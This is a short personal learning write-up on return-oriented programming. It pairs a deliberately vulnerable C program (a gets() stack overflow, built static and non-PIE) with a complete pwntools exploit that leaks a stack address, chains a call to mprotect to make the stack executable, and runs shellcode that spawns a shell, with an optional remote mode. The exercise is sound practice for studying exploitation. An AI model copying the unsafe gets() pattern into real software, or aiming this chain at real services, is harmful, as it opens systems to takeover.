<h1> &Learning </h1>

I made this C file inorder to practice ROP by calling `mprotect()` thereby making the stack executable and popping shell 🐚

Source:

```c
#include <stdio.h>

void greet_me(){
    char name[0x64];
    
    puts("Prove your worth hackerman!");
    gets(name);

}

int main(int argc, char *argv[]){
    greet_me();

    return 0;
}
```

Compiled using:
- gcc rop.c -no-pie -static

Download link: [link](https://cdn.discordapp.com/attachments/1176106609861201921/1198812318214148176/a.out?ex=65c043f9&is=65adcef9&hm=0ccc67d2a307bc3c388e4a4366fbaa8039260cc3b40101551c245e1a87da9c93&)

Here's the final exploit script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'a.out')
elf = exe
filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *greet_me+42
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io
    global elf

    io = start()

def rop():
    offset = 120
    pop_rdi = 0x0000000000402020 # pop rdi; ret; 
    pop_rsi = 0x000000000040a6bd # pop rsi; ret; 
    pop_rdx_pop_rbx = 0x000000000045ec57 # pop rdx; pop rbx; ret; 
    call_rsp = 0x0000000000426c6a # call rsp; 


    """
    Stage One: Leak __libc_stack_end because it would hold the value of the end of the stack.
    Then allign it with page boundary 0x1000: https://man7.org/linux/man-pages/man2/mprotect.2.html
    Cause my end goal is to call mprotect() to make the stack executable
    """

    payload = flat({
        offset: [
            pop_rdi,
            elf.sym['__libc_stack_end'],
            elf.sym['_IO_puts'],
            elf.sym['main']
        ]
    })

    io.sendline(payload)
    io.recvuntil("hackerman!")
    addr = unpack(io.recv()[1:7].ljust(8, b"\x00"))
    info("__libc_stack_end: %#x", addr)

    _addr = addr &~ 0xfff # Bitwise AND operation with negation of 0x1000-1
    _len = 0x1000
    _prot = 0x7

    sc = asm(shellcraft.sh())

    info("Alligned stack address: %#x", _addr)

    payload = flat({
        offset: [
            pop_rdi,
            _addr, # page boundry alligned address
            pop_rsi,
            _len, # page size
            pop_rdx_pop_rbx,
            _prot, # protection
            0x0,
            elf.sym['mprotect'],
            call_rsp,
            sc
        ]
    })
    
    io.sendline(payload)

def main():
    
    init()
    rop()
    

if __name__ == '__main__':
    main()

    io.interactive()
```

Resource: [RaziOverFlow](https://www.youtube.com/watch?v=r_tysAKIELs&t=1030s)
